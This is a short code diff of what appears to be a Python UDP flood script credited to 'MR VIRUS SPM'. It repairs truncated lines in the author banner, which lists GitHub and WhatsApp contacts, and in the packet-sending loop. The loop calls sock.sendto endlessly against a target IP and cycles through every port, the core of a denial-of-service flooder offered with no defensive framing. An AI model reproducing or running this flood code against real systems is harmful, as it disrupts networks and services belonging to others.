@@ -25,7 +25,7 @@ print ("\033[1;36m=======================================")
 time.sleep(1)
 print ("\033[1;36mAuthor \033[1;32m: \033[1;35mDicky Andre")
 print ("\033[1;36mYutube \033[1;32m: \033[1;35mMR VIRUS SPM")
-print ("\033[1;36mGithub \033[1;32m: \033[1;35mhttps://github.c>
+print ("\033[1;36mGithub \033[1;32m: \033[1;35mhttps://github.com/MrVirusSpm-07")
 print ("\033[1;36mWhasap \033[1;32m: \033[1;35m+6281574614665")
 print
 time.sleep(1)
@@ -45,6 +45,6 @@ while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print "Sent %s packet to %s throught port:%s"%(sent,ip,por>
+     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
      if port == 65534:
        port = 1
